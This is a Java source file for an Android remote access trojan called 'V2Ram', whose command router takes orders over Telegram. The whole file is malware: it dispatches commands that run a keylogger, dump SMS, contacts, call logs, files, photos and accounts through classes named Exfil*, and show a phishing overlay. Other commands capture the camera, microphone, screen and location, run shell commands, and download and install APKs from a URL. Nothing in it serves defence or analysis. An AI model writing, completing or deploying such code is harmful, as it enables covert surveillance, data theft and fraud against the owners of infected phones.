// language: Java, file: CommandRouter.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.Context;

import java.util.ArrayList;
import java.util.List;

public class CommandRouter {

    public static void dispatch(String raw) {
        if (raw == null || raw.isEmpty()) return;
        String text = raw.trim();
        String[] parts = text.split("\\s+", 2);
        String cmd = parts[0].toLowerCase();
        String args = parts.length > 1 ? parts[1] : "";

        try {
            if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/menu")) {
                TelegramBot.send(menu());
                return;
            }
            if (cmd.equals("/ping")) {
                TelegramBot.send("pong — acc=" + (AccessibilityBridge.S != null)
                    + " svc=" + TelegramBot.running
                    + " keylog=" + Keylogger.isEnabled());
                return;
            }
            handle(cmd, args);
        } catch (Throwable t) {
            err(t.getMessage());
        }
    }

    static void handle(String cmd, String args) {
        switch (cmd) {

            // ---- UI ----
            case "/home":    UIAutomation.home(); break;
            case "/back":    UIAutomation.back(); break;
            case "/recents": UIAutomation.recents(); break;
            case "/lock":    UIAutomation.lock(); break;
            case "/shade":   UIAutomation.shade(); break;
            case "/qs":      UIAutomation.qs(); break;

            case "/tap": {
                List<String> p = split(args);
                if (p.size() < 2) { err("usage: /tap X Y"); return; }
                float x = parseCoord(p.get(0));
                float y = parseCoord(p.get(1));
                if (x < 0 || y < 0) { err("bad coords: " + p); return; }
                UIAutomation.tap(x, y);
                break;
            }
            case "/swipe": {
                List<String> p = split(args);
                if (p.size() < 4) { err("usage: /swipe X1 Y1 X2 Y2 [ms]"); return; }
                float x1 = parseCoord(p.get(0)), y1 = parseCoord(p.get(1));
                float x2 = parseCoord(p.get(2)), y2 = parseCoord(p.get(3));
                if (x1 < 0 || y1 < 0 || x2 < 0 || y2 < 0) {
                    err("bad coords: " + p); return;
                }
                long ms = p.size() > 4 ? parseLong(p.get(4), 300) : 300;
                UIAutomation.swipe(x1, y1, x2, y2, ms);
                break;
            }
            case "/type":  UIAutomation.type(args); break;
            case "/click": UIAutomation.click(args); break;

            // ---- Screen ----
            case "/shot": {
                String s = ScreenGrab.shot();
                if (s == null) err("shot failed (accessibility + screenshot?)");
                else TelegramBot.sendPhoto(s);
                break;
            }
            case "/rec": {
                int sec = parseInt(args.trim(), 5);
                ScreenGrab.rec(sec);
                TelegramBot.send("<i>rec started: " + sec + "s</i>");
                break;
            }

            // ---- Overlay / toast ----
            case "/overlay": OverlayPhish.show(); break;
            case "/hide":    OverlayPhish.hide(); break;
            case "/toast":   Toaster.show(args); break;

            // ---- Data ----
            case "/sms":      ExfilSms.dump(); break;
            case "/sms_send": {
                List<String> p = split(args);
                if (p.size() < 2) { err("usage: /sms_send NUM TEXT"); return; }
                String num = p.get(0);
                String body = args.substring(num.length()).trim();
                ExfilSms.sendSms(num, body);
                break;
            }
            case "/contacts": ExfilContacts.dump(); break;
            case "/calls":    ExfilCalls.dump(); break;
            case "/gps":      LocationGrab.fetch(); break;
            case "/files":    ExfilFiles.list(args); break;
            case "/get":      ExfilFiles.get(args.trim()); break;
            case "/photos":   ExfilGallery.listRecent(parseInt(args.trim(), 20)); break;
            case "/photo":    ExfilGallery.download(parseLong(args.trim(), 0)); break;

            // ---- Media ----
            case "/cam": CameraGrab.frontShot(); break;
            case "/mic": MicGrab.record(parseInt(args.trim(), 5)); break;

            // ---- Actions ----
            case "/open":      AppIndex.openUrl(args.trim()); break;
            case "/app":       AppIndex.open(args.trim()); break;
            case "/uninstall": AppIndex.uninstall(args.trim()); break;
            case "/call":      AppIndex.call(args.trim()); break;
            case "/vib":       AppIndex.vibrate(parseInt(args.trim(), 1)); break;
            case "/torch": {
                String a = args.trim().toLowerCase();
                CameraGrab.torch(a.equals("on") || a.equals("1") || a.equals("true"));
                break;
            }
            case "/apps": AppIndex.list(); break;

            // ---- Extended ----
            case "/info":    DeviceInfo.dump(); break;
            case "/wifi":    DeviceInfo.wifi(); break;
            case "/sh":      ShellExec.run(args); break;
            case "/clip":    ClipboardGrab.read(); break;
            case "/clipset": ClipboardGrab.write(args); break;
            case "/dl":      ApkInstaller.downloadAndInstall(args.trim()); break;
            case "/notifclear":  NotificationControl.clearAll(); break;
            case "/notifcancel": NotificationControl.cancelPkg(args.trim()); break;
            case "/accounts":    AccountLister.dump(); break;
            case "/keylog": {
                String a = args.trim().toLowerCase();
                if (a.equals("on"))         Keylogger.toggle(true);
                else if (a.equals("off"))   Keylogger.toggle(false);
                else if (a.equals("dump"))  Keylogger.dump();
                else if (a.equals("clear")) Keylogger.clear();
                else TelegramBot.send("<i>usage: /keylog on|off|dump|clear</i>");
                break;
            }

            default:
                TelegramBot.send("<i>unknown:</i> " + TelegramBot.esc(cmd)
                    + "\n/menu — all commands");
        }
    }

    static void err(String msg) {
        TelegramBot.send("<i>err:</i> " + TelegramBot.esc(msg == null ? "?" : msg));
    }

    static String menu() {
        StringBuilder b = new StringBuilder();
        b.append("<b>V2Ram — Android</b>\n")
         .append("<i>device: ").append(android.os.Build.MANUFACTURER)
         .append(" ").append(android.os.Build.MODEL)
         .append(" · sdk ").append(android.os.Build.VERSION.SDK_INT)
         .append("</i>\n\n")

         .append("<b>UI</b>\n")
         .append("/home /back /recents /lock /shade /qs\n")
         .append("/tap X Y · /swipe X1 Y1 X2 Y2 [ms]\n")
         .append("/type TEXT · /click TEXT\n\n")

         .append("<b>Screen</b>\n")
         .append("/shot · /rec N\n\n")

         .append("<b>Overlay</b>\n")
         .append("/overlay · /hide · /toast TEXT\n\n")

         .append("<b>Data</b>\n")
         .append("/sms · /contacts · /calls · /gps\n")
         .append("/sms_send NUM TEXT\n")
         .append("/files DIR · /get PATH\n")
         .append("/apps · /photos N · /photo ID\n\n")

         .append("<b>Media</b>\n")
         .append("/cam · /mic N · /torch on|off\n\n")

         .append("<b>Actions</b>\n")
         .append("/open URL · /app PKG · /uninstall PKG\n")
         .append("/call NUM · /vib N\n\n")

         .append("<b>Extended</b>\n")
         .append("/info · /wifi · /sh CMD\n")
         .append("/clip · /clipset TEXT\n")
         .append("/dl URL · /accounts\n")
         .append("/notifclear · /notifcancel PKG\n")
         .append("/keylog on|off|dump|clear");

        return b.toString();
    }

    static List<String> split(String args) {
        List<String> out = new ArrayList<>();
        if (args == null || args.isEmpty()) return out;
        for (String p : args.split("\\s+")) if (!p.isEmpty()) out.add(p);
        return out;
    }

    static int parseInt(String s, int fallback) {
        try { return Integer.parseInt(s.trim()); }
        catch (Throwable t) { return fallback; }
    }

    static long parseLong(String s, long fallback) {
        try { return Long.parseLong(s.trim()); }
        catch (Throwable t) { return fallback; }
    }

    static float parseCoord(String s) {
        if (s == null) return -1f;
        String t = s.trim().toLowerCase();
        if (t.startsWith("x") || t.startsWith("y")) t = t.substring(1);
        if (t.startsWith("=")) t = t.substring(1);
        try { return Float.parseFloat(t); }
        catch (Throwable ex) { return -1f; }
    }

    static Context ctx() { return TelegramBot.ctx; }
} 